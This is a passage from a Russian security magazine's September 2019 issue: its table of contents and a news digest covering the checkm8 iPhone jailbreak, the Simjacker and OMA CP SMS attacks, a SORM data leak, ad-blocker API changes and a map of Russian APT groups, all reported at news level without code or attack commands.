

                                                  Сентябрь 2019
            № 246
CONTENTS

    MEGANews
  Всё новое за последний месяц

    Бабушка и «Хаос»
  Как моя бабуля съездила в Питер на Chaos Constructions и TechTrain

     Android
  Huawei без Google Play, динамичес кие обновле ния и советы Сно удена

    Как учить ся пентесту
  Со веты экспертов и авто ров «Хакера»

    Где учить ся пентесту
  Обзор площадок для прак тики навыков этичного хакера

    В королевстве PWN
  Препарируем классику переполнения буфера в современ ных усло виях

    «Крепче за баранку держись!»
  Кто и как обманывает «умные» автомобили

    Как приручить рут кит
  Предот вра щаем загрузку вредоносных модулей в Linux

    Универ сальный перехват
  Как обой ти SSLPinning раз и навсегда и читать тра фик любого приложения

    Полет пче лы
  Как работа ют сети ZigBee и как искать уязвимости в них

    Пот рошим шпионскую «малину»
  Как я нашел неизвес тную Raspberry Pi в серверной и уста новил вла дельца

    Убой ный текст
  Выполняем произволь ный код в Vim и Neovim

    Боевой OSINT
  Разбира ем современ ные методы сетевой разведки

    Электрон ный фейскон троль
  Как исполь зует ся распознавание лиц в Китае

    Все мы не в своем уме
  Как сделать новый навык для «Алисы» на Python

    Речь в речь
  Создаем нейрон ную сеть, которая подделыва ет голос

     Raspberry Pi 4
  Что дают четыре ядра и четыре гига в четвертой ревизии «малинки»

    Экономим на «вин де»
  Как оптимизировать зат раты на софт на примере бухгалте рии

   Шлюз безопасности
  За щища ем рабочую поч ту при помощи кас томных кон тент-фильтров

     Border Gateway Protocol
  Изучаем хит рости и обхо дим под водные камни

    Операция BrainfuckPC
  Как я постро ил самый безумный релейный компьютер и не стал на этом останав ливаться

    Тон на все го
  Как работа ет TON и почему это не прос то блок чейн

     Тит ры
  Кто дела ет этот журнал
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru





ДЖЕЙЛБРЕЙК ДЛЯ
IPHONE
В конце сентября ИБ‐исследователь, извес тный под псевдонимом axi0mX,
опубликовал в открытом доступе джей лбрейк, под ходящий практичес ки
для любых устрой ств Apple с чипами от A5 до A11, выпущенными меж‐
ду 2011 и 2017 годами. То есть джейлбрейк акту ален для моделей от iPhone
4S до iPhone 8 и X. Его нельзя использовать удаленно — нужен физический
доступ к устройству.
  Джейлбрейк, над которым специалист, по собственному признанию,
работал  весь  год,  полага ется  на новый  эксплоит Checkm8  (читается
как checkmate, то есть «шах и мат») для уяз вимости в bootrom. Сам axi0mX
описывает этот эксплоит как «перманентный и неис правляемый».
  Дело в том, что большинство джейлбрейков эксплуатируют уяз вимости
в операционной системе iOS и ее компонентах, а вот об уязвимостях
в bootrom и их эксплуата ции речь заходит нечасто. В то же время именно
такие джейлбрейки ценятся больше всего, так как явля ются перманентными,
ведь для исправления уяз вимости в bootrom требует ся физическая модифи‐
кация чипсетов устрой ств и ни одна компания не ста нет отзывать из продажи
такое количество гаджетов и заменять их.
  Последний джейлбрейк, использующий проб лемы bootrom, был создан
почти десять лет назад известным хакером Джорджем Хоцем aka geohot, так
что релиз Checkm8 — это без преувеличения зна ковое событие, ведь многие
считали, что инженерам Apple уда лось устра нить все бреши в этой области.
  Код axi0mX уже доступен на GitHub, хотя пока это лишь бета‐версия, явно
не предназначенная для массового пользователя, которая может случайно
превратить устрой ство в «кир пич». Исследователь пишет, что джейлбрейк
не работает на устрой ствах на базе Apple A12 и A13, а также могут воз никать
проблемы со старыми устройствами вроде iPhone 4S, которым он пока
не уделял много времени.


19% УЯЗ ВИМОСТЕЙ В IOS — КРИТИЧЕСКИЕ


По информации ком пании ESET, количество угроз для iOS рас тет. Эксперты отме чают, что, воп‐
реки распространенному заблужде нию, абсолютно неуязвимых ОС не бывает, и опе рационных
систем Apple это тоже каса ется.

Так, в первом полугодии 2019 года эксперты обнаружили 155 уязвимостей в мобильной плат‐
форме Apple. Это на 24% больше, чем за аналогичный период 2018 года. И почти вдвое
больше, чем количество уязвимос тей в Android. Впрочем, только 19% уязвимостей в iOS кри‐
тические.


Настоящим трендом 2019 года стали уязвимос ти для iOS, которые открывали ранее исправ‐
ленные ошибки, а также поз волили создать джейлбрейк для версии 12.4.





УЯЗВИМОСТИ SIM‐
КАРТ И АТАКИ ЧЕРЕЗ
SMS
В этом месяце ИБ‐эксперты поведа ли миру сра зу о двух проблемах, которые
представ ляют опасность для львиной доли мобиль ных устройств. Причем эти
проблемы не зависят от плат формы и типа устройств пользовате лей, так
как связаны с SIM‐картами и принципами работы мобильных операторов.


Simjacker
Атаку Simjacker описали специалисты компании AdaptiveMobile Security. Она
связана с использованием SMS‐сообщений для передачи инструкций SIM
Toolkit (STK) и S@T Browser на SIM‐карте. Интересно, что эта проблема пред‐
ставляет собой не просто концепт, она регулярно применяется в реальности
в последние два года. «Мы уверены, что этот экс плоит был раз работан кон‐
кретной  частной  компанией,  которая  работает  с  правительствами
для мониторинга отдельных лиц», — пишут эксперты.
  Специалисты AdaptiveMobile не рас кры вают название компании, ведущей
эти атаки, и потому неяс но, используется данная проблема для слежки
за преступниками и террористами или же ее при меняют для отсле живания
диссидентов, активистов и журналис тов.
  По информации исследова телей, та же неназ ванная компания имеет рас‐
ширенный доступ к базовой сети SS7 и Diameter и цели Simjacker‐атак неред‐
ко становятся жер твами атак через SS7. Судя по всему, атаки с исполь‐
зованием SS7 — менее предпочтительный и запас ной вари ант на случай,
если Simjacker не работа ет. Дело в том, что в пос леднее время операторы
уделяют куда боль ше времени и сил защите своей SS7‐ и Diameter‐
инфраструктуры, тогда как ата ки Simjacker дешевы и просты в исполнении.
   Суть атаки заключается в том, что с помощью смартфона или простого
GSM‐модема злоумышленник отправляет на устройство жертвы спе циальное
SMS‐сообщение, содержащее скрытые инс трукции для SIM Toolkit. Данные
инструкции  поддерживаются  приложением S@T  Browser,  работающим
на SIM‐карте устройства.
  STK и S@T Browser — старые технологии, поддерживаемые многими
мобильными сетями и SIM‐картами. С их помощью на устройстве можно, нап‐
ример, запустить браузер, воспро извести звук или показывать всплывающие
окна. Раньше мобильные операторы нередко использовали  это, чтобы
отправлять пользователям рекламные предложения или платежную информа‐
цию.
   Атака Simjacker подразумевает, что злоумышленник злоупотребляет дан‐
ным механизмом и приказывает устрой ству жертвы передать данные о мес‐
тоположении и IMEI, которые SIM‐карта отпра вит в SMS‐сообщении на сто‐
роннее устройство, и ата кующий в ито ге сможет узнать местоположение сво‐
ей цели.
  При этом пострадавшие от ата ки пользователи не видят никаких SMS‐
сообщений и других следов компро метации. То есть злоумышленники могут
постоянно заваливать своих жертв SMS‐сооб щениями и таким образом
отслеживать их местополо жение на про тяжении долгих недель или даже
месяцев. Так как атака Simjacker направлена на SIM‐карту, она не зависит
от платформы и типа устройства пользователя.





     «Мы заметили, что устройства поч ти всех производите лей успешно
      поз воляют узнать данные о мес тоположении пользовате ля: Apple, ZTE,
       Motorola, Samsung, Google, Huawei и даже IoT-устройства с SIM-кар-
      тами», — пишут иссле дова тели.

Эксперты AdaptiveMobile отмечают, что атаки Simjacker выполняются ежед‐
невно в большом количестве. Чаще всего телефонные номера отслежива‐
ются несколько раз в день в течение долгого времени.



      «Схе мы и количес тво отсле жива ющих устройств ука зыва ют на то, что
      это не мас штабная опе рация мас сового  сле жения, но опе рация
      для отсле жива ния большого чис ла людей в раз личных целях, причем
      цели и приоритеты опе раторов меняются», — говорят экспер ты.

Также аналитики отмечают, что атаки Simjacker мож но легко предотвратить,
если операторы уделят внимание тому, какой именно код работает на их SIM‐
картах. Дело  в  том,  что спецификация S@T  Browser не обновлялась
с 2009 года, а изначальная функциональность, вроде получения информации
о балансе счета через SIM‐карту, давно уста рела и на смену ей пришли дру‐
гие технологии. Однако уста ревший S@T Browser по‐прежнему используется
и присутствует на SIM‐картах операторов мобильной связи как минимум
в тридцати странах мира.
  Суммарно в этих стра нах проживает более одного миллиарда человек,
и все они подвергаются риску незамет ной слежки с помощью Simjacker.
По данным СМИ, операторы Sprint и T‐Mobile заявили, что их пользователи
не пострадали, а пред ставители AT&T уверяют, что их американская сеть
неуязвима перед такими ата ками.
  Среди других команд, поддерживаемых S@T  Browser, числится воз‐
можность совершать звонки, отправлять сообщения, отключать SIM‐карту,
запускать команды AT‐модема, открывать браузеры и многое дру гое. То есть
при помощи атак Simjacker можно не только следить за пользователями, но и
заниматься финансовым мошенничеством (звонки на пре миальные номера),
шпионажем (совершить вызов и прос лушивать разговоры рядом с устрой‐
ством), саботажем (отклю чение SIM‐карты жертвы), устраивать дезинформи‐
рующие кампании (рассылка SMS/MMS с фальшивым контентом) и так далее.
  Нужно отметить, что Simjacker‐ата ки не такое уж новое явление. К при‐
меру, злоупотребление инструкциями STK на теоретическом уровне описал
еще в 2011 году ИБ‐специалист Богдан Алеку. Тогда эксперт предупреждал,
что это можно использовать, чтобы отправлять SMS на платные номера
или создавать трудности при получении обычных текстовых сообщений. Так‐
же аналогичная атака была продемонс трирова на в 2013 году на кон ференции
Black Hat.


Опасные SMS
Аналитики компании Check Point предуп редили, что многие устройства на An‐
droid (включая девайсы Samsung, Huawei, LG, Sony и, возможно, других про‐
изводителей) уязвимы перед весь ма занят ными атаками. Для их реализации
понадобится подделать всего одно специаль ное SMS‐сообщение, какие
обычно приходят от операторов мобильной связи, и злоумышленник сможет
перехватывать элек тронную почту или тра фик с уяз вимых устройств.
  Проблема, обнаруженная специалис тами, связана с инструкциями OMA
CP (Open  Mobile  Alliance  Client  Provisioning).  Речь  идет о  стандарте,
с помощью которо го операторы мобильной свя зи могут отправлять клиент‐
ским устройствам настройки сети в виде специаль ных сообщений. Такие
сообщения могут содер жать нас тройки сервера MMS‐сооб щений, адрес
прокси, почтовый сервер, настройки домашней страницы браузера и зак‐
ладок, серверы для син хронизации контактов и календаря и многое другое.
  Иссле дователи обна ружили, что четыре произво дителя смартфонов внед‐
рили этот стандарт на своих устройствах небезопас ным способом. Смартфо‐
ны Samsung, Huawei, LG и Sony могут при нимать сообщения OMA CP, даже
если те были получены из ненадежного источни ка.





Проще всего оказалось атаковать устройства Samsung, так как они принима‐
ют любые сообщения OMA CP без какой‐либо аутентификации или верифи‐
кации. Смартфо ны Huawei, LG и Sony защище ны чуть лучше, так как в их слу‐
чае отправитель сооб щения хотя бы дол жен предоставить IMSI устройства.
   Хотя теоре тически коды IMSI трудно получить, специалисты объясняют, что
ничего невозможного нет. К примеру, мобильные операторы предоставля ют
платные сервисы, с помощью которых они переводят номера телефонов
в коды IMSI для сторонних пос тавщиков услуг мобиль ной связи. То есть зло‐
умышленник может получить IMSI от самого провайдера за небольшую плату.
Хуже того, почти треть всех Android‐ приложений имеют доступ к IMSI устрой‐
ства, так как успешно запросили соот ветс твующие разрешения. А значит,
хакеры могут исполь зовать коды IMSI, полученные с помощью вре доносных
приложений или утечек данных.
   Атака, описанная Check Point, неавтоматичес кая (пользователь должен
нажать кнопку и принять уста новку новых нас троек атакующего), но иссле‐
дователи пре дупреждают, что злоумышленники могут без труда подделать
отправителя. Фактически у получа теля нет никаких реальных способов опре‐
делить, кто отправил такое сооб щение. Увы, это означает, что многие поль‐
зователи согласятся изменить нас тройки устройства на новые, полагая, что
они получены от реального оператора мобильной связи.
  В  итоге,  подменив  настройки,  злоумышленник  сможет,  например,
перенаправить  весь  тра фик жер твы  через свой вредоносный сервер.
Для реализации такой ата ки не нужно никако го специального оборудования:
для отправ ки SMS будет достаточно GSM‐модема (USB‐донгла за десять
долларов либо телефона, работа ющего в режиме модема) и прос того скрип‐
та.





       Сообщение OMA CP, раз битое на два SMS и содер жащее пейлоад

К счастью, три из четырех про изво дителей, названных в докладе, уже работа‐
ют над исправлением данной проб лемы:
 • Samsung включила патч для этой проб лемы в май ский набор обновлений;
 • LG выпустила свое исправление в июле;
 • Huawei планирует внести необходимые исправления в UI для следующего
   поколения смартфонов серии Mate и серии P.

Единственный производитель, не собирающийся исправлять проблему, —
компания Sony. Исследова тели объясня ют, что инженеры Sony «отказались
признать уязвимость, заявив, что их устройства соответствуют спецификации
OMA CP».
  Но аналитики Check Point не только рекомендуют производителям выпус‐
тить патчи, а пользователям — уста новить их. По их мне нию, мобильные опе‐
раторы должны блокиро вать сообщения OMA CP на уровне сети, чтобы сооб‐
щения такого типа не имели возможности пройти через их сети, если только
не были отправ лены самим оператором. По словам экспертов, в настоящее
время доверять сооб щениям OMA CP нельзя вовсе и лучше отклонять их все.


ДАННЫЕ НА ПОДЕР ЖАННЫХ ЖЕСТКИХ ДИС КАХ
Эксперты из Университета Хар тфордшира провели интересное исследование по заказу ком‐
пании Comparitech. Специаль но для эксперимен та Comparitech приобрела 200 подержанных
жестких дисков (половину купили в США, другую половину — в Великобритании), которые про‐
тестировали, чтобы увидеть, сколько из них содержат подлежащую восстановлению информа‐
цию.

9% от общего количества бэушных жестких дис ков, которые можно приобрести с рук на eBay
и других подобных ресурсах, не очищаются должным образом и по‐прежнему содержат дан ные
предыдущих владельцев.





37% дисков из Великобритании были отформатированы, а в США таковых нас читывалось лишь
14%.
На накопителях были найдены дан ные о занятости и заработ ной плате пре дыдущих вла‐
дельцев, фотографии их семей и отдыха, деловые документы, за явления на получение
визы, резюме и заявления о при еме на работу, списки паролей, сканы паспортов
и водительских прав, налоговые документы, вы писки из банков и многое другое.

26% дисков были очи щены должным образом, и никакие дан ные с них вос становить не уда‐
лось.

26% были отформатированы, но данные все еще можно было восстановить, приложив
минимальные усилия.

17% содержали удаленные данные, восстановить которые было не очень трудно.

16% жестких дисков даже не попытались очистить перед продажей.

16% дисков не могли быть прочитаны вовсе.





США СУДЯТСЯ СО
СНОУДЕНОМ
В середине сентября в продажу вышла книга Permanent Record, по сути пред‐
ставляющая собой мему ары, написанные Эдвардом Сноуденом. В этой кни‐
ге, которая будет опубликова на на рус ском языке в ноябре текуще го года,
Сноуден подробно рас ска зывает о том, как похитил те самые секретные
документы, как передал их СМИ, а затем бежал за границу, в итоге получив
убежище в России, где и остается до сих пор. Также на страницах Permanent
Record можно найти множество раз мышлений о приватности, опасных пос‐
ледствиях массового сбора личной информа ции и многом другом.
  Разумеется, выход мемуаров Сноудена не оста вили без внимания аме‐
риканские власти, но на публикацию книги они отреагировали весьма неожи‐
данным образом. Стало извес тно, что Министерство юстиции США подало
гражданский иск против Эдварда Сноудена за несоблюдение соглашений
о неразглашении, которые тот подписывал с АНБ и ЦРУ.
  В соответствии с этими документами Сноуден дол жен был перед пуб‐
ликацией представить книгу на рас смотрение и одобрение правительству
США. Данный пункт стандартный в госконтрактах и пред назначен именно
для предотвращения рас крытия секретной информа ции бывшими агентами,
в том числе в мемуарах и художественных произведениях.
  При этом Минюст не пытается блокировать распространение самой кни ги,
но просит суд передать влас тям все средства, вырученные от продаж Perma‐
nent Record.



      «Раз ведданные должны защищать нашу нацию, а не приносить лич ную
      прибыль, — пишет прокурор США по Вос точному окру гу Вир джинии
      Закари Тер виллигер (Zachary Terwilliger). — Этот иск гарантиру ет, что
      Эдвард Сноуден не получит никакой финансовой выгоды от наруше-
      ния доверия, которое было ему ока зано».

Представители Американского союза гражданских свобод (ACLU) и юристы
Сноудена уже подвергли иск американских властей критике. По их мнению,
книга не содержит никаких пра вительственных секретов, которые не пуб‐
ликовались бы авторитетными новостными организа циями ранее.



      «Если бы мис тер Сноуден полагал, что пра вительство будет доб-
      росовес тно рас сматривать его книгу, он бы пред ста вил ее на рас-
      смотрение. Но пра вительство по‑прежнему нас таивает на том, что
     обще извес тные фак ты, которые обсужда ются во всем мире, до сих
      пор каким‑то обра зом оста ются сек ретны ми», — пишут предста вите ли
      ACLU.


РОСКОМНАДЗОР НЕ ОТСТАЕТ ОТ TELEGRAM
Роскомнадзор по‐прежнему намеревается блокировать Telegram. В рамках форума «Вся Рос‐
сия» глава ведомства сообщил, что в течение года планирует представить результаты работы
новой системы блокировок, нап равлен ной на противодействие запрещен ному контенту и бло‐
кировку Telegram.





→«Мы над этим воп росом работаем. Я думаю, что в пределах года нам будет что вам расска‐
зать. Это будет борьба снаряда и брони… Вопросом мы этим занимаемся, и пиратский корабль
когда‐нибудь, навер ное, мы подор вем по‐серьезному»
— заявил Александр Жаров





ВНЕЗАПНО СОРМ
Специалист компании UpGuard Крис Викери (Chris Vickery) случайно обна‐
ружил в Сети свободно доступный резервный диск, при надлежащий сот‐
руднику компании Nokia. Диск содержал около 1,7 Тбайт данных, пролива‐
ющих свет на работу рос сийской СОРМ (Система технических средств
для обеспечения функций оперативно‐разыскных мероприятий), в час тности
в сетях оператора МТС.





Представители Nokia объяснили журналис там издания TechCrunch, что один
из их сотрудников подключил USB‐накопитель со старыми рабочими фай‐
лами к своему домашнему компьютеру, а из‐за ошиб ки в настрой ках его
компьютер и этот носитель были свободно дос тупны из интернета для любого
желающего.
  Специалисты UpGuard сообщили Nokia об утечке данных сразу после ее
обнаружения, 9 сентября 2019 года, и компании понадобилось четыре дня
для ликвидации бреши. В настоящее время представители Nokia еще про‐
должают расследование инцидента.
  Представите ли Nokia подчеркивают, что полностью соб людают рос сий‐
ское законодательство:



      «Пос кольку это стандар тное тре бова ние для пра вомер ного перехвата
      [данных] в Рос сии и пос тавщики СОРМ должны быть одобрены соот-
      ветс тву ющими уполномоченными органами, мы работа ем и с дру гими
      ком паниями для реализации воз можнос тей СОРМ в сетях, которые мы
      пре дос тавляем», — говорят пред ста вите ли Nokia, сообщая, что одна
      из таких ком паний — «Малвин Сис темс».

Среди попавших в открытый доступ документов были и те, что описывали
механику работы СОРМ в сетях МТС, так как оборудование оператору свя зи
поставляет Nokia. Документы демонс трировали схемы установки СОРМ‐обо‐
рудования, технические пла ны (содержащие физический адрес, включая
номер этажа, а также мес тополо жение каждой защищенной изолированной
комнаты с оборудованием СОРМ, куда у пос торонних нет доступа) и так
далее.


                                     Продолжение статьи →
← Начало статьи





   Так, в бумагах можно найти информа цию об уста новке СОРМ как минимум
   в шестнадцати городах, помимо Мос квы: в Белгороде, Брянске, Владимире,
  Воронеже, Иванове, Калуге, Костро ме, Курске, Липецке, Орле, Рязани, Смо‐
  ленске, Тамбове, Твери, Туле и Ярос лавле.
     Кроме  того,  среди  данных  присутствовали 700  Гбайт  фотографий
   (578 тысяч изображений), в том числе демонстрирующих СОРМ‐аппаратуру
  с хорошо различимыми серийными номерами и штрих‐кодами.





  Стоит напомнить, что информация о работе СОРМ попадает в Сеть далеко
  не впервые. К примеру, в 2017 году на WikiLeaks были опубликованы бумаги,
  рассказывающие о компаниях, которые занима ются техничес кой стороной
  интернет‐слежки за пользователями, и о том, как власти заставляют провай‐
  деров за свой счет устанавливать СОРМ. Однако теперь спе циалис ты
  полагают, что текущая утечка может быть опас на с других позиций. Так,
  исполнительный директор Общества защиты интерне та Михаил Климарев
  полагает, что утечка может нанес ти немалый вред МТС:



         «Кто успел ска чать эти архивы, никому не извес тно. Потенциальные
         тер рорис ты  могли  узнать  довольно  чувс твительную  информа цию
        и могут нанес ти инфраструк туре МТС непоп равимый ущерб. И ник то
        не может поручиться, что у дру гих круп ных опе раторов не произойдет
         что‑то подобное».


 84% РОССИЯН НЕ ХОТЯТ «СВЕТИТЬ» СВОИ ДЕЙСТВИЯ
 В ИНТЕРНЕТЕ

   Специалисты «Лаборатории Касперского» провели опрос сре ди пользователей, пос вящен ный
   приватности в Сети. Как выяснилось, 84% россиян не хотят, чтобы кто‐то был в курсе, что
   именно они делают в интернете. Для сравнения: лишь 65% предпочли бы скрыть, как они про‐
   водят время в реальной жизни.


   Для защиты своих границ пользователи применяют самые разные методы. Так, больше полови‐
   ны россиян (54%) регулярно чистят историю в браузере, 24% отме тили, что для регис трации
   на большинстве сай тов исполь зуют фейковые име на, каждый пятый (22%) общается только
   через зашифрованные мессен джеры, а 12% ищут информацию в приватных поис ковиках.
   При этом почти 40% даже не защищают устройство паролем, а 64% не проверяют и не меня‐
   ют настройки приватности на своих устройствах, а также в приложениях или сервисах.

   Большинство опрошенных (68%) согласно с тем, что в современном цифровом мире пол‐
   ностью сохранять приватность невозможно. Три из четырех рес пондентов (74%) хотели бы
   знать больше о том, как защитить от чужих глаз свою деятельность в онлай не, но только в том
   случае, если эта информация будет доставаться им бесплатно. Платить деньги за курсы и тре‐
   нинги, чтобы повысить навыки сохранения приватности, готовы лишь 17% пользовате лей.





 БОРЬБА С
 БЛОКИРОВЩИКАМИ
 РЕКЛАМЫ
  Для пользователей блокировщиков контента и дру гих защитных расширений
  для браузеров в этом месяце есть две новос ти — хорошая и плохая.
     Хорошая новость заключается в том, что раз работчики Mozilla пообе щали
  сохранить функции API, необ ходимые для корректной работы блокировщиков
  рекламы и других расширений в Firefox.
    Напомню, что блокировщики контента и другие расширения могут постра‐
   дать из‐за изме нений, которые инженеры Google пла ниру ют внести в Manifest
   V3, определяющий возможности и ограничения для расширений. Конечно,
  Chrome и Firefox — это два раз ных бра узера, но часть их кодовой базы все же
  «пересекается», вклю чая WebExtensions  API, при помощи которого рас‐
  ширения взаимодейству ют с бра узером.
    В настоящее время оба браузера используют WebExtensions API v2, нез‐
  начительно варьирующийся для каждого из браузеров, но в целом API прак‐
   тически одинаков. Данный API является частью Chromium, и в прошлом году
  разработчики Google сообщили, что планиру ют значительно обновить Mani‐
   fest V3. Многие разработчики расширений и блокировщиков контента заяви‐
  ли, что после таких изменений их продукты попросту перес танут работать.
     Суть проблемы заключается в том, что вмес то webRequest разработчикам
  будет предложено использовать declarativeNetRequest API, а, по словам мно‐
   гих девелоперов, переход на другой API, сильно отличающийся от webRe‐
   quest и во многом ему усту пающий, в сущности, ста нет «смертью» их продук‐
   тов.
     Теперь инженеры Mozilla сообщили, что не будут бездумно следовать
  за изменениями в WebExtensions API и внесут собс твенные коррективы. Так,
  разработчики Firefox не намерены отка зывать ся от использования blocking
  webRequest, столь необ ходимо го для корректной работы блокировщиков
  и многих других расширений.
    Пока неизвестно, как именно девелоперы Mozilla намерены выйти из ситу‐
   ации, но представители орга низации обещают обсу дить возможные тех‐
  нические решения с самими раз работчиками рас ширений и совместно опре‐
  делить планы.
     Ранее инженеры Opera, Brave и Vivaldi уже заверили, что они тоже сох‐
  ранят или перенесут функцию webRequest из V2 на V3. Единственный бра‐
   узер, разработчики которого пока не обозначили свою позицию по отно‐
  шению к грядущему Manifest V3, — это Edge на базе Chromium компании
   Microsoft.
     Плохая новость, в свою очередь, зат рагива ет только пользователей
  устройств Apple. Издание ZDNet обра тило внимание, что на фоне шквала кри‐
   тики, обрушившегося на Google, довольно интерес но выглядит картина, сло‐
  жившаяся вокруг компании Apple. Дело в том, что Apple точно так же огра‐
  ничила работу бло кировщиков и дру гих рас ширений в Safari, однако никто
  не возмутился и не обратил на это внимания.
     Все началось еще несколько лет назад,  когда Apple анонсировала
  механизм App Extensions, с помощью которого приложения могут расширять
  свою функциональность на другие приложения. Тогда разработчики заявили,
   что App Extensions будет работать в тандеме с Content Blocker — механиз‐
  мом, представленным в составе iOS 9 еще в 2013 году. По сути, приложения
  или их расширения могут использовать API Content Blocker, чтобы сообщить
   Safari, что именно нужно бло кировать, основыва ясь на наборе правил,
  который вступает в дело перед загрузкой стра ницы.
    В итоге, внедрив эти механизмы в свою экосис тему, инженеры Apple
  пришли к выводу, что веб‐разработ чикам не нуж но создавать расширения
  для Safari напрямую, вместо этого они могут использовать приложения в App
   Store и таким образом предоставить пользователям Safari дополнительные
  функции.
    В результате в середине 2018 года Apple объявила экосистему рас‐
  ширений устаревшей и начала рекомендовать раз работчикам рас ширений
  переносить свой код в App Store в качестве рас ширений приложений. Первый
  шаг в этом направлении был сделан в сентябре 2018 года, когда Apple выпус‐
   тила iOS 12 и начала бло кировать установку устаревших расширений не из
   Safari Extensions Gallery. К концу того года Apple окончательно перестала при‐
  нимать устаревшие расширения в Safari Extensions Gallery, а также начала
  отключать устаревшие продукты в бра узерах поль зователей с сообщением
   «Safari отклю чил расширения, которые замедляют работу в интерне те».
     Тогда многие разработчики рас ширений писали, что такое всплы вающее
  окно появилось для любых рас ширений без разбора, независимо от того, что
  расширение сделало (или не сделало). Многие тогда предположили, что
  таким образом Apple побуждает пользователей отказаться от устаревших
  расширений ради использования App Extensions.
    Начиная с сентября 2019 года и релиза iOS 13 Apple окончательно отка‐
  залась от Safari Extensions Gallery и офи циально объявила, что расширения
   устарели. Теперь поль зователи Safari не могут уста новить устаревшее рас‐
  ширение вообще, независимо от того, используют они iOS или macOS, раз‐
  мещено расширение в Safari Extensions Gallery или же нет. Более того, поль‐
  зователи Apple практичес ки не обращали вни мания на эти пос тепенные
  изменения, так как видели сплошные преимущества в происходящем: уни‐
  версально работающие App Extensions и новый API Content Blocker, который
   Apple преподносила как способ изолирования рас ширений и запрета доступа
   к информации браузера.
     Все эти изменения уже негативно повлияли на многие блокировщики кон‐
   тента, VPN, расширения для обеспечения родительского контроля и так
   далее. Например, блокировщик  рекламы AdGuard  закрыл рас ширение
  для Safari еще в июле прош лого года. Вско ре после этого компания Malware‐
   bytes уведомила о прекращении разработки своего VPN‐рас ширения. А соз‐
  датели AdBlock написали большой пост в блоге, сообщив, что их переделан‐
  ный блокировщик рекламы для Safari теперь работа ет быстрее, чем раньше,
  но также привели и длинный список его недос татков. Осенью 2018 года, пос‐
  ле выпуска iOS 12, их примеру пос ледова ли и дру гие приложения.
    Наконец, сов сем недавно была прекращена разработка uBlock Origin
  для Safari, а разработчик расширения рекомендовал пользователям либо
  перейти на Firefox для Mac, где блокировщики по‐прежнему работают, либо
   остаться на более старой версии  Safari  (что нельзя назвать хорошим
   советом). Переключиться на использование одного из новых блокировщиков
  на основе Content Blocker, конечно, тоже можно, но разработчик охарак‐
  теризовал новую систему как «крайне ограниченную в функциональности
  блокирования рекламы».
    Но большинство разработчиков расширений просто перенесли свой код
  и не стали возмущаться, в отличие от ситуации с Google. Вероятно, все дело
   в том, что Apple строго следит за соблюдением пра вил в App Store, а несог‐
  ласные разработчики обычно попросту изгоняют ся. Так, если Chrome осно‐
  ван на Chromium с открытым исходным кодом, где разработчики име ют право
   голоса, то Apple — это закрытая экосистема с жесткими правилами. Также
  не стоит забывать и о том, что пользователей у Safari не так уж много. С долей
  рынка в 3,5% Safari не стоит даже близ ко к Chrome, чье лидерс тво на рынке
  неоспоримо и составляет 65%.
     Кроме того, ZDNet отмечает, что нельзя сбрасывать со сче тов и проблему
  общественного воспри ятия. Ког да Apple запус тила новую функцию блокиров‐
   ки контента для замены старых рас ширений и сообщила, что та предназна‐
  чена для повышения конфиденциальности (пос коль ку рас ширения не смогут
   получить доступ к информации бра узера), все просто поверили в это. Тогда
   как в случае Google реклама — это краеугольный камень для компании. И ког‐
  да Google объявила о намерении ограничить блокировщики контента, все
   увидели в этом стремление большой корпорации сохранить свою при быль,
  а не меру безопасности, как об этом говорили инженеры Google.
    Подводя итог: теперь в Safari нельзя установить клас сический блокиров‐
  щик рекламы, и в будущем Apple намеревает ся удалить или отключить уста‐
  ревшие расширения в пользовательских браузерах. Если же пользователи
  перешли на новый блокировщик рекламы из App Store, то нужно понимать,
   что, скорее всего, он не смо жет блокировать все объявления.
    Дело в том, что для API Content Blocker уста новлен максимальный лимит
   в 50 тысяч правил для каждого нового расширения‐блокировщика. Это весь‐
  ма скромное число, ведь, ког да Google попыталась ограничить максимальное
  количество правил планкой в 30 тысяч, разработчики возмутились, и даже
  смена лимита до уровня от 90 до 120 тысяч по‐прежнему не устраивает мно‐
   гих. Кстати, именно поэтому не стоит удивлять ся, что AdBlock для Safari стал
  работать быстрее: теперь он имеет дело с куда меньшим количес твом пра‐
   вил, чем раньше.
    В итоге пока Firefox для Mac оста ется единс твенным выходом для запуска
  полноценного бло кировщика контента на macOS. Тогда как в случае iOS воз‐
  можности использовать более старый и надеж ный блокировщик рекламы нет
  вовсе, независимо от браузера.


  САМЫЕ АТАКУЕМЫЕ ПОРТЫ
   Специалисты Alert Logic проанализировали более 5000 атак (совершенных в течение шести
   месяцев, с ноября 2018 года по апрель 2019 года) на 4000 своих клиентов — компаний малого
   и среднего бизнеса и перечислили в своем отчете основные слабые стороны компаний.

   Для проведения атак чаще всего используют порты 22, 80 и 443, которые соответствуют SSH
   (Secure Shell), HTTP (Hypertext Transfer Protocol) и HTTPS (Hypertext Transfer Protocol Secure).

   По данным аналитиков, 65% атак были связаны с этими портами, что вполне логично, ведь они
   должны быть открыты для общения.

   На четвертом месте находится RDP, отвечающий за удаленную связь меж ду компьюте рами.
  И серьезному риску подвергаются FTP-порты 20 и 21.





   Также безопасность орга низаций часто под рывают сла бое шиф рование и ус таревшее ПО,
   на долю которых приходится соответс твен но 66% и 75% проблем.

   Так, более 66% хостов работали под управлением Windows 7, поддержка которой будет
   прекращена в январе 2020 года. Хуже того, Windows XP, финальная версия которой вышла
   в далеком 2008 году, а поддержка была прекращена в 2014‐м, тоже используется во мно жес‐
   тве компаний.

   Хотя в сетях своих клиентов эксперты Alert Logic обнаружили даже системы Windows NT
   (выпущенные в 1993 году).





 КАРТА РОССИЙСКИХ
 APT
  Компании Check Point и Intezer Labs представили результат своих совместных
   трудов. Аналитики изучили порядка 2000 экземпля ров малвари, чтобы соз‐
   дать интерактивную карту свя зей между русско язычными группами «пра‐
   вительственных хакеров».
    Иссле дователи объясняют, что экосистема русскоязычных APT (advanced
   persistent threat) развилась в очень сложную структуру и сейчас совсем трудно
  разобраться, кто есть кто в рос сийском кибершпи онаже.
    Иссле дование специалистов выявило более 22 тысяч связей и 3,85 мил‐
  лиона частей кода, связывающие различные вредоносы между собой. В итоге
  специалисты пришли к выводу, что российские APT редко делятся кодом друг
  с другом. По мнению исследова телей, нечастые случаи повторного исполь‐
  зования кода обычно имеют место в рамках одной раз ведывательной службы.
  Из этого аналитики заключа ют, что три основных российских агентства (ФСБ,
  ГРУ и СВР), отвечающие за кибероперации за рубежом, практически не сот‐
  рудничают друг с другом в ходе сво их кампаний.





  Авторы исследования полага ют, что пра вительство намеренно стимулирова‐
